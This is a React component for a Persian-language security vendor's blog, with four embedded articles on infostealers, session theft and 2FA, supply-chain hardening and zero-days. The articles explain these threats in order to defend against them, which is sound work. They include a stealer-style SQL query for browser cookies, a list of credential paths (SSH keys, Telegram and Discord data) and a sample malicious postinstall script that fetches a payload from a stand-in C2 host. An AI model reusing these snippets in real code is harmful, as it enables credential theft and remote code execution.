"use client";

import React, { useState } from "react";
import {
  BookOpen,
  Calendar,
  Clock,
  User,
  ArrowLeft,
  X,
  Share2,
  Bookmark,
  CheckCircle,
  ShieldAlert,
  Terminal,
  Search,
} from "lucide-react";

export interface BlogPost {
  id: string;
  title: string;
  slug: string;
  summary: string;
  category: "استیلر و بدافزار" | "دفاع و هاردنینگ" | "هویت و سشن‌ها" | "تحقیقات زیرودی";
  readTime: string;
  date: string;
  author: string;
  authorRole: string;
  tags: string[];
  content: {
    intro: string;
    sections: {
      heading: string;
      paragraphs: string[];
      codeSnippet?: string;
      callout?: string;
    }[];
    conclusion: string;
    actionableTakeaways: string[];
  };
}

export const BLOG_POSTS: BlogPost[] = [
  {
    id: "post-1",
    title: "کالبدشکافی بدافزارهای استیلر مدرن: ردلاین، لومما و استیلرهای زبان Go چگونه اطلاعات را می‌دزدند؟",
    slug: "modern-infostealers-anatomy-redline-lumma",
    summary:
      "بررسی فنی و گام‌به‌گام نحوه استخراج پسوردها، سشن کوکی‌های مرورگر، کیف‌پول‌های کریپتو و توکن‌های تلگرام و دیسکورد توسط بدافزارهای خانواده Stealer.",
    category: "استیلر و بدافزار",
    readTime: "۷ دقیقه",
    date: "۲ مهر ۱۴۰۳",
    author: "تیم تحلیل تهدیدات رهام",
    authorRole: "Roham Threat Labs",
    tags: ["Infostealer", "RedLine", "Lumma", "DPAPI", "Session Theft"],
    content: {
      intro:
        "در سال‌های اخیر، بدافزارهای سرقت اطلاعات یا Infostealerها به بزرگ‌ترین تهدید امنیت سایبری برای سازمان‌ها و کاربران تبدیل شده‌اند. بر خلاف تروجان‌های دسترسی از راه دور (RAT) سنتی، استیلرها برای ماندگاری طولانی طراحی نشده‌اند؛ آن‌ها در عرض کمتر از ۶۰ ثانیه اجرا می‌شوند، تمام دارایی‌های هویتی را می‌ربایند و از سیستم خارج می‌شوند.",
      sections: [
        {
          heading: "۱. عبور از لایه امنیتی پایگاه داده SQLite مرورگرها",
          paragraphs: [
            "مرورگرهای مبتنی بر کرومیوم (Chrome, Edge, Brave) تاریخچه، بوکمارک‌ها و کوکی‌ها را در فایل‌های SQLite ذخیره می‌کنند. مسیر داده‌های حساس مرورگرها معمولاً در پوشه AppData\\Local کاربر قرار دارد.",
            "استیلرها ابتدا این فایل‌ها را حتی در زمان باز بودن مرورگر با ایجاد یک کپی در دایرکتوری Temp می‌خوانند تا خطای قفل بودن فایل (File Lock Error) مانع دسترسی آن‌ها نشود.",
          ],
          codeSnippet:
            "# نمونه ساختار کوئری استیلر برای خواندن کوکی‌های لاگین\nSELECT host_key, name, path, encrypted_value FROM cookies WHERE host_key LIKE '%.google.com' OR host_key LIKE '%.github.com';",
          callout:
            "نکته حیاتی: حتی اگر احراز هویت دو مرحله‌ای (2FA) فعال باشد، استیلر با دزدیدن سشن کوکی زنده (Session Hijacking) مستقیماً بدون نیاز به پسورد وارد حساب قربانی می‌شود.",
        },
        {
          heading: "۲. دور زدن رمزنگاری Windows DPAPI",
          paragraphs: [
            "ویندوز از رابط DPAPI برای رمزنگاری کلید اصلی (Master Key) کرومیوم استفاده می‌کند. بدافزار استیلر با بهره‌گیری از توابع سیستمی و فراخوانی مستقیم API با دسترسی کاربر لاگین شده، کلید مستر را دیکریپت کرده و با الگوریتم AES-GCM مقادیر کوکی‌ها و رمزها را آشکار می‌سازد.",
            "از نسخه ۱۲۷ گوگل کروم، مکانیزم جدیدی به نام App-Bound Encryption افزوده شده است، اما استیلرهای جدیدتر (مانند نسخه‌های به‌روز Lumma و Meduza) با تزریق کد به پروسه‌های مجاز سیستم عامل تلاش در دور زدن آن دارند.",
          ],
        },
        {
          heading: "۳. سرقت کلیدهای SSH، توکن‌های دیسکورد و تلگرام",
          paragraphs: [
            "علاوه بر مرورگر، پوشه .ssh برای سرقت کلیدهای سرورها و مسیر session تلگرام و Local Storage نرم‌افزارهای دسکتاپ هدف اولیه استیلرهاست. این به مهاجم اجازه می‌دهد فوراً به زیرساخت‌های ابری سازمان نفوذ کند.",
          ],
          codeSnippet:
            "// مسیرهای کلیدی که استیلر بلافاصله جاروب می‌کند:\n%APPDATA%\\Telegram Desktop\\tdata\n%USERPROFILE%\\.ssh\\id_rsa\n%APPDATA%\\discord\\Local Storage\\leveldb",
        },
      ],
      conclusion:
        "آنتی‌ویروس‌های سنتی بر پایه امضای فایل (Signature-based) توانایی مسدودسازی استیلرهای مدرن را که دائماً با Obfuscatorهای نوظهور پَک می‌شوند ندارند. راهکار اساسی، ایزوله‌سازی سشن‌ها و مانیتورینگ بلادرنگ دسترسی به فایل‌های کلیدی هویت است.",
      actionableTakeaways: [
        "سشن کوکی‌ها را مهم‌تر از پسورد بدانید و تایم‌اوت سشن‌های ادمین را کوتاه کنید.",
        "از ذخیره کردن پسوردهای سازمانی در ذخیره‌ساز توکار مرورگر جداً خودداری کنید.",
        "ایستگاه‌های کاری را مجهز به محافظ‌های اختصاصی ضد استیلر (مانند آنتی‌استیلر رهام) نمایید.",
        "کلیدهای سخت‌افزاری FIDO2 / Passkey را جایگزین تایید هویت پیامکی کنید.",
      ],
    },
  },
  {
    id: "post-2",
    title: "چرا تایید دو مرحله‌ای پیامکی (SMS 2FA) در برابر سرقت سشن بی‌اثر است؟ راهکار Passkey و FIDO2",
    slug: "why-sms-2fa-fails-against-session-theft",
    summary:
      "توضیح ساده و علمی درباره این که چرا پیامک کد تایید نمی‌تواند جلوی حملات دزدی کوکی را بگیرد و چطور استانداردهای نوین سخت‌افزاری امنیت کامل را برقرار می‌کنند.",
    category: "هویت و سشن‌ها",
    readTime: "۵ دقیقه",
    date: "۲۸ شهریور ۱۴۰۳",
    author: "واحد پژوهش رمزنگاری رهام",
    authorRole: "Roham Crypto & Identity Team",
    tags: ["FIDO2", "Passkeys", "WebAuthn", "2FA Security", "Session Hijacking"],
    content: {
      intro:
        "بسیاری از مدیران فناوری اطلاعات باور دارند با فعال‌سازی پیامک تایید دو مرحله‌ای، حساب‌های کارمندان در امان است. اما آمارهای سال ۲۰۲۴ نشان می‌دهد بیش از ۷۰ درصد نفوذهای موفق به شرکت‌های بزرگ با وجود داشتن 2FA فعال صورت گرفته است. دلیل این رخداد چیست؟",
      sections: [
        {
          heading: "تفاوت فاز «احراز هویت» با فاز «نگهداری سشن»",
          paragraphs: [
            "تایید دو مرحله‌ای پیامکی فقط در لحظه «لاگین اولیه» بررسی می‌شود. پس از وارد کردن رمز و کد پیامک، سرور یک کوکی سشن (Session Cookie) صادر می‌کند تا کاربر مجبور نباشد با هر کلیک مجدداً رمز بزند.",
            "مهاجمی که از طریق بدافزار استیلر به سیستم قربانی دسترسی پیدا می‌کند، نیازی به لاگین کردن ندارد! او به سادگی کوکی سشن معتبر را روی مرورگر خود بارگذاری کرده و سرور او را دقیقاً همان کاربر احراز هویت شده قبلی تلقی می‌کند.",
          ],
          callout:
            "کوکی سشن همانند کلید فیزیکی هتل است؛ مهم نیست هنگام ورود به لابی چه کارتی نشان داده‌اید، هر کس کلید اتاق را در دست داشته باشد وارد اتاق می‌شود.",
        },
        {
          heading: "چرا استاندارد FIDO2 و Passkey مقاوم به سرقت است؟",
          paragraphs: [
            "در استاندارد FIDO2 / WebAuthn، کلید خصوصی درون ماژول سخت‌افزاری امن (TPM لپ‌تاپ یا کلید USB سخت‌افزاری YubiKey) ذخیره می‌شود.",
            "مهم‌تر از آن، درخواست‌های امضا شده به آدرس دامنه (Origin-bound) گره خورده‌اند. بنابراین مهاجم حتی اگر بتواند ارتباط را شنود کند یا فیشینگ بزند، کلید خصوصی قابل استخراج و انتقال به سیستم دیگری نیست.",
          ],
        },
      ],
      conclusion:
        "گروه امنیتی رهام توصیه می‌کند سازمان‌ها به سرعت خط‌مشی هاردنینگ سشن و احراز هویت بیومتریک بدون پسورد (Passkey) را به جای پیامک‌های آسیب‌پذیر مستقر کنند.",
      actionableTakeaways: [
        "سیاست Device Binding برای سشن‌های ادمین و منابع ابری فعال شود.",
        "تایید هویت پیامکی از حساب‌های دارای دسترسی بالا حذف و کلید سخت‌افزاری اجباری گردد.",
        "در صورت مشکوک شدن به نفوذ، گزینه «خروج از تمام دستگاه‌ها» (Revoke All Sessions) فورا اجرا شود.",
      ],
    },
  },
  {
    id: "post-3",
    title: "راهنمای گام‌به‌گام امن‌سازی ایستگاه کاری برنامه‌نویسان در برابر Dependency Confusion و Poisoned Packages",
    slug: "developer-workstation-hardening-supply-chain",
    summary:
      "چگونه لپ‌تاپ توسعه‌دهندگان به دروازه ورود بدافزارها به شبکه سازمان تبدیل می‌شود و راهکارهای پیشگیری از نفوذ از طریق npm و PyPI چیست؟",
    category: "دفاع و هاردنینگ",
    readTime: "۸ دقیقه",
    date: "۲۰ شهریور ۱۴۰۳",
    author: "مهندسی DevSecOps رهام",
    authorRole: "Roham Enterprise Security",
    tags: ["Supply Chain", "npm", "PyPI", "DevSecOps", "Developer Hardening"],
    content: {
      intro:
        "توسعه‌دهندگان نرم‌افزار به دلیل داشتن دسترسی مستقیم به کلیدهای API، سورس‌کدهای سازمانی و توکن‌های گیت‌هاب، اصلی‌ترین تارگت مهندسی اجتماعی و حملات زنجیره تامین هستند.",
      sections: [
        {
          heading: "پکیج‌های مسموم چگونه اجرا می‌شوند؟",
          paragraphs: [
            "مهاجمان با نام‌گذاری پکیج‌هایی بسیار شبیه به کتابخانه‌های پرکاربرد (Typosquatting) یا سوءاستفاده از اسکریپت‌های preinstall در فایل package.json، کدهای استیلر را در لحظه اجرای دستور ساده npm install یا pip install اجرا می‌کنند.",
            "این کدها اغلب به صورت بیس۶۴ یا با استفاده از لودرهای چند مرحله‌ای در پس‌زمینه اجرا شده و کلیدهای ssh و متغیرهای فایل .env را به سرور C2 ارسال می‌کنند.",
          ],
          codeSnippet:
            "// نمونه اسکریپت مخرب در package.json تقلبی:\n\"scripts\": {\n  \"postinstall\": \"node -e \\\"require('https').get('https://c2-malicious.xyz/payload.js',r=>{/*...*/})\\\"\"\n}",
        },
        {
          heading: "راهکارهای محافظت از سیستم‌های توسعه",
          paragraphs: [
            "۱. اجرای پکیج‌ها با پرچم --ignore-scripts در محیط‌های غیر ایزوله.",
            "۲. استفاده از ریپازیتوری‌های محلی مدیریت پکیج (مانند Nexus یا Verdaccio) همراه با اسکن امنیتی خودکار.",
            "۳. جداسازی کامل محیط توسعه اصلی از فعالیت‌های وبگردی عمومی با استفاده از ماشین مجازی یا WSL2 ایزوله شده.",
          ],
        },
      ],
      conclusion:
        "امنیت کل سیستم از امن‌ترین خط کد آغاز نمی‌شود، بلکه از سیستمی آغاز می‌شود که کد را کامپایل می‌کند.",
      actionableTakeaways: [
        "هرگز فایل‌های حاوی رمز یا توکن (.env) را در مسیر پیش‌فرض بدون رمزنگاری رها نکنید.",
        "از ابزارهای مانیتورینگ رفتار پروسه برای شناسایی درخواست‌های شبکه مشکوک در نود جی‌اس استفاده کنید.",
        "ورژن لاک فایل‌ها (package-lock.json) را به طور مستمر در CI/CD اعتبارسنجی کنید.",
      ],
    },
  },
  {
    id: "post-4",
    title: "مفهوم آسیب‌پذیری روز صفر (Zero-Day): چرخه کشف، اکسپلویت و پچ امنیتی به زبان ساده",
    slug: "understanding-zero-day-vulnerabilities-lifecycle",
    summary:
      "مروری بر مفاهیم بنیادین کتاب «از روز صفر تا روز صفر» و چگونگی تبدیل یک نقص حافظه در نرم‌افزار به خطرناک‌ترین سلاح سایبری دنیا.",
    category: "تحقیقات زیرودی",
    readTime: "۶ دقیقه",
    date: "۱۰ شهریور ۱۴۰۳",
    author: "واحد پژوهش و نشر رهام",
    authorRole: "Roham Vulnerability Research",
    tags: ["Zero-Day", "Memory Corruption", "Exploit", "Fuzzing", "Patching"],
    content: {
      intro:
        "کلمه روز صفر (Zero-Day) ترسناک‌ترین واژه در ادبیات امنیت سایبری است. این اصطلاح به این معناست که توسعه‌دهنده نرم‌افزار «صفر روز» برای رفع مشکل وقت داشته است، زیرا حمله قبل از آگاهی او آغاز شده است.",
      sections: [
        {
          heading: "آسیب‌پذیری چگونه کشف می‌شود؟",
          paragraphs: [
            "محققان امنیتی و هکرهای قانون‌مند با استفاده از متدهای پیشرفته مثل فازینگ (Fuzzing) با ابزارهایی چون AFL++ و تحلیل کد با دیباگرها، ورودی‌های غیرمنتظره به برنامه تزریق می‌کنند تا رفتارهای نامتعارف مانند خطای حافظه (Memory Crash) را ثبت کنند.",
            "نقص‌های حافظه نظیر سرریز بافر (Buffer Overflow) یا Use-After-Free در زبان‌های سطح پایینی نظیر C و ++C می‌توانند کنترل جریان اجرای برنامه را به دست مهاجم بسپارند.",
          ],
        },
        {
          heading: "پل میان کشف آسیب‌پذیری تا اکسپلویت پایدار",
          paragraphs: [
            "پیدا کردن کرش تنها ۲۰ درصد مسیر است. تبدیل کرش به اکسپلویت پایدار که از مکانیزم‌های دفاعی مدرن چون ASLR و DEP/NX عبور کند، نیازمند تکنیک‌های پیچیده‌ای چون ROP Chain و Heap Spraying است؛ موضوعاتی که در کتابخانه تخصصی رهام به صورت فصل‌به‌فصل آموزش داده شده است.",
          ],
        },
      ],
      conclusion:
        "درک مکانیزم اکسپلویت‌های زیرودی بهترین روش برای ایجاد سیستم‌های دفاعی غیرقابل نفوذ است. خواندن کتاب «از روز صفر تا روز صفر» در کتابخوان رهام نقطه شروع ایده‌آلی برای این مسیر است.",
      actionableTakeaways: [
        "کتاب کامل «از روز صفر تا روز صفر» را در کتابخوان داخلی مطالعه کنید.",
        "سیستم‌عامل و نرم‌افزارهای سازمان را با اتوماسیون پچ به‌روز نگه دارید.",
        "از مکانیزم‌های ایزولاسیون و سندباکس پردازه‌ها استفاده کنید.",
      ],
    },
  },
];

interface BlogSectionProps {
  onOpenReader?: () => void;
  onOpenConsultation?: () => void;
}

export const BlogSection: React.FC<BlogSectionProps> = ({ onOpenReader }) => {
  const [selectedCategory, setSelectedCategory] = useState<string>("همه");
  const [activeArticle, setActiveArticle] = useState<BlogPost | null>(null);
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [bookmarkedIds, setBookmarkedIds] = useState<string[]>([]);
  const [searchQuery, setSearchQuery] = useState("");

  const categories = ["همه", "استیلر و بدافزار", "دفاع و هاردنینگ", "هویت و سشن‌ها", "تحقیقات زیرودی"];

  const filteredPosts = BLOG_POSTS.filter((post) => {
    const matchesCategory = selectedCategory === "همه" || post.category === selectedCategory;
    const matchesSearch =
      searchQuery.trim() === "" ||
      post.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
      post.summary.toLowerCase().includes(searchQuery.toLowerCase()) ||
      post.tags.some((t) => t.toLowerCase().includes(searchQuery.toLowerCase()));
    return matchesCategory && matchesSearch;
  });

  const toggleBookmark = (id: string, e: React.MouseEvent) => {
    e.stopPropagation();
    setBookmarkedIds((prev) =>
      prev.includes(id) ? prev.filter((item) => item !== id) : [...prev, id]
    );
  };

  const copyArticleLink = (post: BlogPost, e: React.MouseEvent) => {
    e.stopPropagation();
    if (typeof window !== "undefined") {
      navigator.clipboard.writeText(`${window.location.origin}/#blog-${post.slug}`).catch(() => {});
      setCopiedId(post.id);
      setTimeout(() => setCopiedId(null), 2000);
    }
  };

  return (
    <section id="blog" className="py-20 bg-slate-950 border-b border-slate-900 text-slate-100 relative">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        {/* Section Header */}
        <div className="flex flex-col md:flex-row md:items-end justify-between gap-6 mb-12">
          <div className="space-y-3">
            <div className="flex items-center gap-2 text-xs font-mono uppercase tracking-wider text-emerald-400">
              <BookOpen className="w-4 h-4 text-emerald-400" />
              <span>پایگاه دانش، بینش و تحلیل امنیت سایبری رهام</span>
            </div>
            <h2 className="text-3xl sm:text-4xl font-extrabold text-white tracking-tight">
              وبلاگ تخصصی و مقالات دفاع سایبری
            </h2>
            <p className="text-slate-400 text-sm sm:text-base max-w-2xl leading-relaxed">
              تحلیل‌های عمیق، خوانا، ساده و بدون پیچیدگی از تهدیدات واقعی استیلرها، معماری‌های امن و راهکارهای حفاظت از اطلاعات حساس.
            </p>
          </div>

          {/* Search Input */}
          <div className="relative w-full md:w-72 shrink-0">
            <Search className="w-4 h-4 text-slate-500 absolute right-3.5 top-1/2 -translate-y-1/2 pointer-events-none" />
            <input
              type="text"
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              placeholder="جستجو در مقالات و تگ‌ها..."
              className="w-full bg-slate-900/90 border border-slate-800 focus:border-emerald-500 rounded-xl pr-10 pl-3 py-2.5 text-xs text-slate-200 placeholder-slate-500 focus:outline-none transition-colors"
            />
          </div>
        </div>

        {/* Category Filters */}
        <div className="flex items-center gap-2 overflow-x-auto pb-4 mb-8 scrollbar-none text-xs">
          {categories.map((cat) => (
            <button
              key={cat}
              onClick={() => setSelectedCategory(cat)}
              className={`px-4 py-2 rounded-xl transition-all font-medium whitespace-nowrap cursor-pointer ${
                selectedCategory === cat
                  ? "bg-emerald-600 text-white shadow-md shadow-emerald-950"
                  : "bg-slate-900/80 text-slate-400 hover:text-slate-200 hover:bg-slate-800 border border-slate-800"
              }`}
            >
              {cat}
            </button>
          ))}
        </div>

        {/* Blog Posts Grid */}
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6 lg:gap-8">
          {filteredPosts.map((post) => {
            const isBookmarked = bookmarkedIds.includes(post.id);
            return (
              <article
                key={post.id}
                onClick={() => setActiveArticle(post)}
                className="group p-6 sm:p-7 rounded-2xl bg-slate-900/70 border border-slate-800 hover:border-emerald-500/50 hover:bg-slate-900 transition-all duration-200 flex flex-col justify-between cursor-pointer"
              >
                <div className="space-y-4">
                  {/* Top metadata */}
                  <div className="flex items-center justify-between gap-2 text-xs">
                    <span className="px-2.5 py-1 rounded-lg bg-emerald-950/70 border border-emerald-800/40 text-emerald-400 font-medium">
                      {post.category}
                    </span>
                    <div className="flex items-center gap-3 text-slate-500 text-[11px]">
                      <span className="flex items-center gap-1">
                        <Clock className="w-3.5 h-3.5" />
                        {post.readTime}
                      </span>
                      <span>·</span>
                      <span className="flex items-center gap-1">
                        <Calendar className="w-3.5 h-3.5" />
                        {post.date}
                      </span>
                    </div>
                  </div>

                  {/* Title */}
                  <h3 className="text-lg sm:text-xl font-bold text-white group-hover:text-emerald-300 transition-colors leading-snug">
                    {post.title}
                  </h3>

                  {/* Summary */}
                  <p className="text-xs sm:text-sm text-slate-400 leading-relaxed line-clamp-3">
                    {post.summary}
                  </p>

                  {/* Tags */}
                  <div className="flex flex-wrap gap-1.5 pt-1">
                    {post.tags.map((tag) => (
                      <span
                        key={tag}
                        className="text-[10px] px-2 py-0.5 rounded bg-slate-800/80 text-slate-400 font-mono"
                      >
                        #{tag}
                      </span>
                    ))}
                  </div>
                </div>

                {/* Bottom actions & Author */}
                <div className="pt-6 mt-6 border-t border-slate-800/80 flex items-center justify-between text-xs">
                  <div className="flex items-center gap-2 text-slate-400">
                    <User className="w-3.5 h-3.5 text-emerald-400" />
                    <span>{post.author}</span>
                  </div>

                  <div className="flex items-center gap-2">
                    <button
                      onClick={(e) => copyArticleLink(post, e)}
                      className="p-1.5 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800 transition-colors"
                      title="کپی لینک مقاله"
                    >
                      {copiedId === post.id ? (
                        <CheckCircle className="w-4 h-4 text-emerald-400" />
                      ) : (
                        <Share2 className="w-4 h-4" />
                      )}
                    </button>
                    <button
                      onClick={(e) => toggleBookmark(post.id, e)}
                      className="p-1.5 rounded-lg text-slate-400 hover:text-amber-400 hover:bg-slate-800 transition-colors"
                      title={isBookmarked ? "حذف از نشان‌شده‌ها" : "نشان کردن این مقاله"}
                    >
                      <Bookmark
                        className={`w-4 h-4 ${isBookmarked ? "fill-amber-400 text-amber-400" : ""}`}
                      />
                    </button>
                    <span className="flex items-center gap-1 text-emerald-400 font-semibold group-hover:translate-x-[-3px] transition-transform pr-1">
                      <span>مطالعه مقاله</span>
                      <ArrowLeft className="w-3.5 h-3.5" />
                    </span>
                  </div>
                </div>
              </article>
            );
          })}
        </div>

        {filteredPosts.length === 0 && (
          <div className="text-center py-16 bg-slate-900/40 rounded-2xl border border-slate-800/60 p-8">
            <p className="text-slate-400 text-sm">هیچ مقاله‌ای با عبارت جستجوی شما یافت نشد.</p>
            <button
              onClick={() => {
                setSearchQuery("");
                setSelectedCategory("همه");
              }}
              className="mt-4 px-4 py-2 rounded-xl bg-slate-800 text-slate-300 text-xs hover:bg-slate-700"
            >
              پاک‌سازی فیلترها
            </button>
          </div>
        )}

        {/* Link to Full Technical Book */}
        <div className="mt-12 p-6 rounded-2xl bg-gradient-to-r from-slate-900 via-slate-900 to-emerald-950/30 border border-slate-800 flex flex-col sm:flex-row items-center justify-between gap-4">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center shrink-0">
              <BookOpen className="w-5 h-5 text-emerald-400" />
            </div>
            <div>
              <h4 className="text-sm font-bold text-white">علاقه‌مند به یادگیری عمیق‌تر هستید؟</h4>
              <p className="text-xs text-slate-400">
                کتاب جامع ۱۱ فصلی «از روز صفر تا روز صفر» در کتابخوان اختصاصی رهام در دسترس است.
              </p>
            </div>
          </div>
          {onOpenReader && (
            <button
              onClick={onOpenReader}
              className="px-4 py-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-semibold flex items-center gap-2 border border-slate-700 whitespace-nowrap cursor-pointer transition-colors"
            >
              <span>باز کردن کتابخوان تخصصی</span>
              <ArrowLeft className="w-3.5 h-3.5" />
            </button>
          )}
        </div>
      </div>

      {/* Clean, Distraction-Free Article Reading Modal */}
      {activeArticle && (
        <div
          className="fixed inset-0 z-50 bg-black/70 backdrop-blur-sm flex items-center justify-center p-3 sm:p-6 overflow-y-auto animate-in fade-in duration-200"
          onClick={() => setActiveArticle(null)}
          style={{ direction: "rtl" }}
        >
          <div
            className="w-full max-w-3xl max-h-[90vh] bg-slate-950 border border-slate-800 rounded-3xl shadow-2xl flex flex-col overflow-hidden my-auto"
            onClick={(e) => e.stopPropagation()}
          >
            {/* Modal Top Bar */}
            <div className="p-4 sm:p-5 border-b border-slate-800/80 bg-slate-900/80 flex items-center justify-between gap-3 sticky top-0 z-10 backdrop-blur-md">
              <div className="flex items-center gap-2 truncate">
                <span className="px-2.5 py-0.5 rounded-md text-[11px] font-mono bg-emerald-950 border border-emerald-800/40 text-emerald-400">
                  {activeArticle.category}
                </span>
                <span className="text-xs text-slate-400 hidden sm:inline">
                  {activeArticle.readTime} مطالعه
                </span>
              </div>

              <div className="flex items-center gap-2">
                <button
                  onClick={(e) => copyArticleLink(activeArticle, e)}
                  className="p-2 rounded-xl text-slate-400 hover:text-white hover:bg-slate-800 transition-colors"
                  title="کپی پیوند"
                >
                  {copiedId === activeArticle.id ? (
                    <CheckCircle className="w-4 h-4 text-emerald-400" />
                  ) : (
                    <Share2 className="w-4 h-4" />
                  )}
                </button>
                <button
                  onClick={() => setActiveArticle(null)}
                  className="p-2 rounded-xl text-slate-400 hover:text-white hover:bg-slate-800 transition-colors"
                  title="بستن پنجره مطالعه"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>
            </div>

            {/* Modal Article Content (Highly Readable Typography) */}
            <div className="flex-1 overflow-y-auto p-6 sm:p-10 space-y-8 text-slate-200">
              {/* Header */}
              <div className="space-y-4 border-b border-slate-800/80 pb-6">
                <h1 className="text-2xl sm:text-3xl font-extrabold text-white leading-snug tracking-tight">
                  {activeArticle.title}
                </h1>

                <div className="flex flex-wrap items-center gap-4 text-xs text-slate-400">
                  <span className="flex items-center gap-1.5 text-emerald-400 font-medium">
                    <User className="w-3.5 h-3.5" />
                    {activeArticle.author} ({activeArticle.authorRole})
                  </span>
                  <span>·</span>
                  <span className="flex items-center gap-1.5">
                    <Calendar className="w-3.5 h-3.5 text-slate-500" />
                    {activeArticle.date}
                  </span>
                  <span>·</span>
                  <span className="flex items-center gap-1.5">
                    <Clock className="w-3.5 h-3.5 text-slate-500" />
                    زمان مطالعه: {activeArticle.readTime}
                  </span>
                </div>
              </div>

              {/* Intro Lead Paragraph */}
              <div className="text-base sm:text-lg text-slate-300 leading-relaxed font-medium bg-slate-900/50 p-5 rounded-2xl border-r-4 border-emerald-500">
                {activeArticle.content.intro}
              </div>

              {/* Sections */}
              <div className="space-y-8">
                {activeArticle.content.sections.map((sec, idx) => (
                  <div key={idx} className="space-y-4">
                    <h2 className="text-xl font-bold text-white tracking-tight flex items-center gap-2">
                      <span className="w-2 h-2 rounded-full bg-emerald-400 inline-block" />
                      {sec.heading}
                    </h2>

                    {sec.paragraphs.map((p, pIdx) => (
                      <p key={pIdx} className="text-sm sm:text-base text-slate-300 leading-relaxed">
                        {p}
                      </p>
                    ))}

                    {sec.codeSnippet && (
                      <div className="rounded-xl overflow-hidden border border-slate-800 bg-slate-950 font-mono text-xs my-4" style={{ direction: "ltr", textAlign: "left" }}>
                        <div className="bg-slate-900/90 px-3.5 py-1.5 text-[11px] text-slate-400 border-b border-slate-800 flex items-center gap-1.5">
                          <Terminal className="w-3 h-3 text-emerald-400" />
                          <span>Code snippet</span>
                        </div>
                        <pre className="p-4 text-emerald-300/90 overflow-x-auto leading-relaxed">
                          {sec.codeSnippet}
                        </pre>
                      </div>
                    )}

                    {sec.callout && (
                      <div className="p-4 rounded-xl bg-amber-500/10 border border-amber-500/30 text-amber-200 text-xs sm:text-sm flex items-start gap-2.5">
                        <ShieldAlert className="w-4 h-4 text-amber-400 shrink-0 mt-0.5" />
                        <div>{sec.callout}</div>
                      </div>
                    )}
                  </div>
                ))}
              </div>

              {/* Conclusion */}
              <div className="space-y-3 pt-4 border-t border-slate-800/80">
                <h3 className="text-lg font-bold text-white">جمع‌بندی تحلیلی</h3>
                <p className="text-sm sm:text-base text-slate-300 leading-relaxed">
                  {activeArticle.content.conclusion}
                </p>
              </div>

              {/* Actionable Takeaways Checklist */}
              <div className="p-6 rounded-2xl bg-emerald-950/20 border border-emerald-800/30 space-y-3">
                <h4 className="text-sm font-bold text-emerald-400 flex items-center gap-2">
                  <CheckCircle className="w-4 h-4" />
                  <span>توصیه‌های اقدام‌محور برای سازمان‌ها و توسعه‌دهندگان</span>
                </h4>
                <ul className="space-y-2 text-xs sm:text-sm text-slate-300">
                  {activeArticle.content.actionableTakeaways.map((item, i) => (
                    <li key={i} className="flex items-start gap-2">
                      <span className="text-emerald-400 font-bold shrink-0">✓</span>
                      <span>{item}</span>
                    </li>
                  ))}
                </ul>
              </div>
            </div>

            {/* Modal Bottom Footer */}
            <div className="p-4 border-t border-slate-800 bg-slate-900/60 flex items-center justify-between text-xs text-slate-400">
              <span className="font-mono text-[11px]">گروه امنیتی رهام · نشر دانش دفاع سایبری</span>
              <button
                onClick={() => setActiveArticle(null)}
                className="px-4 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 transition-colors cursor-pointer"
              >
                بستن و بازگشت به مقالات
              </button>
            </div>
          </div>
        </div>
      )}
    </section>
  );
};
